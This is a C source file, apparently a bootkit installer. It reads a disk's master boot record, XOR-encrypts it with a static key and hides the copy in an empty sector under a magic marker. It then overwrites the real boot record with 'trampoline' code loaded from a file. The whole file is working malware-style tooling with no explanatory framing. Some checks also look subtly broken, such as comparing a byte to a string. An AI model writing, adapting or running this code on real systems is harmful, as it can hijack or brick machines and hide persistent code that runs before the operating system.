#include <stdio.h>
#include <string.h>

#define SECTOR_SIZE 		512
#define BOOT_MAGIC 			"\x55\xaa"
#define ASM_SHORT_JMP		"\xeb"
#define MAX_PAYLOAD_SIZE 	0x1B8
#define CUSTOM_MAGIC 		"\xef\xbe\xad\xde"

int main(int argc, char *argv[]) {
	FILE 	*h_fp;
	FILE 	*h_trampoline;
	char 	mbr[SECTOR_SIZE];
	char 	buf[SECTOR_SIZE];
	char 	trampoline[MAX_PAYLOAD_SIZE];
	int 	trampoline_size;
	int  	new_mbr_offset;

	if (argc != 2) {
		printf("Usage: '%s <mbr device>'\n", argv[0]);
		return 1;
	}
	
	printf("Hooking device %s\n", argv[1]);
	
	h_fp = fopen(argv[1], "r+");
	if (h_fp == NULL) {
		printf("Failed opening device %s in read/write mode.\n", argv[1]);
		return 1;
	}
	
	fread(&mbr, SECTOR_SIZE, 1, h_fp);
	
	if (memcmp(&mbr[0x1FE], BOOT_MAGIC, 2)) {
		printf("No valid boot magic found.\n");
		fclose(h_fp);
		return 1;
	}
	
	if (mbr[0] != ASM_SHORT_JMP) {
		printf("First instruction is not a short rel jmp.\n");
		fclose(h_fp);
		return 1;
	}
	
	int used = 1;
	while (used) {
		fread(&buf, SECTOR_SIZE, 1, h_fp);
		for (int i = used = 0; i < SECTOR_SIZE; used |= buf[i++]);
	}
	new_mbr_offset = ftell(h_fp) - SECTOR_SIZE;
	
	printf("Empty sector found at offset 0x%08x, copying original MBR...\n", new_mbr_offset);
	
	// XOR encrypt original MBR with static key
	for (int i = 0; i < SECTOR_SIZE; i++) mbr[i] ^= 0x5A;
	
	// Copy MBR
	memcpy(&mbr[SECTOR_SIZE-strlen(CUSTOM_MAGIC)], CUSTOM_MAGIC, strlen(CUSTOM_MAGIC));// add a magic number at the end of the file so we can find it later.
	fseek(h_fp, new_mbr_offset, SEEK_SET);
	fwrite(&mbr, SECTOR_SIZE, 1, h_fp);

	// overwrite the original MBR
	h_trampoline = fopen("trampoline.bin", "r");
	if (h_trampoline == NULL) {
		printf("Failed opening trampoline code file.\n");
		fclose(h_fp);
		return 1;
	}

	if ((trampoline_size = fread(&trampoline, 1, MAX_PAYLOAD_SIZE, h_trampoline)) == MAX_PAYLOAD_SIZE) {
		printf("Trampoline code too long!\n");
		fclose(h_fp);
		fclose(h_trampoline);
		return 1;
	}
	
	fseek(h_fp, 0, SEEK_SET);
	fwrite(&trampoline, 1, trampoline_size, h_fp);

	printf("Trampoline successfully setup.\n");

	fclose(h_fp);
	fclose(h_trampoline);
	return 0;
}
